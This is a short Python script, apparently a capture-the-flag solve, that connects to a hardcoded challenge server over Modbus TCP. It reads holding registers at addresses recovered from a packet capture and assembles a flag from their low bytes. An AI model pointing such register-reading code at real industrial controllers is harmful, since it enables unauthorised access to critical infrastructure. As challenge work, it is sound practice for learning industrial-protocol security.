#!/usr/bin/env python3
import socket
from time import sleep
from umodbus import conf
from umodbus.client import tcp

# interpret registers as signed 16-bit values
conf.SIGNED_VALUES = True

# The Modbus slave ID we saw on the wire
SLAVE_ID = 52

# All starting addresses that were written in the capture
register_addresses = [
    6, 10, 12, 21, 22, 26, 47, 53, 63, 77,
    83, 86, 89, 95, 96, 104, 123, 128, 131, 134, 139,
    143, 144, 145, 153, 163, 168, 173, 179, 193, 206,
    210, 214, 215, 219, 221, 224, 225, 226, 231, 239, 253
]

# Connect to the live challenge server
HOST = '94.237.54.192'
PORT = 43277

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

flag = ''
for addr in register_addresses:
    # build and send a Read Holding Registers request for one register
    cmd = tcp.read_holding_registers(SLAVE_ID, addr, 1)
    resp = tcp.send_message(cmd, sock)  # returns a list of int(s)
    # each register is 16 bits; we pull the lower‚Äêbyte as ASCII
    flag += chr(resp[0] & 0xFF)
    sleep(0.05)

sock.close()

print("FLAG:", flag)
